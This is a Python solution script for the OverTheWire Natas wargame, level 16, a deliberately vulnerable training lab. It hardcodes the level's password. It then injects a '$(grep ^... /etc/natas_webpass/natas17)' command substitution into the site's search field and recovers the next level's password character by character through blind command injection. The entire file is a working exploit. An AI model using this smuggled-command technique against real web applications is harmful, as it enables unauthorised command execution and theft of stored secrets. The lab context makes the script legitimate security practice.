import requests
import re
import os ,sys
from string import *


cmd = ""
os_name = sys.platform
if os_name == 'win32':
	cmd = "cls"
elif os_name == 'linux' or os_name == 'darwin':
	cmd =  "clear"

characters = ascii_lowercase + ascii_uppercase + digits
username = "natas16"
pasword = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
url = "http://%s.natas.labs.overthewire.org"%username

# anaesthetics grep ^* /etc/natas_webpass/natas17
session = requests.Session()
seen_password = list()

while (len(seen_password) < 32):

	for ch in characters:
		print("Trying char : ", "".join(seen_password) + ch)
		response = session.post(url , data={ "needle" : "anaesthetics$(grep ^" + "".join(seen_password) + ch + " /etc/natas_webpass/natas17)" } , auth=(username,pasword))
		content = response.text
		flag = re.findall("<pre>\n(.*)\n</pre>" , content)
		if flag == []:
			seen_password.append(ch)
		os.system(cmd)

flag = "".join(seen_password)
print("[+] Gotcha ",flag)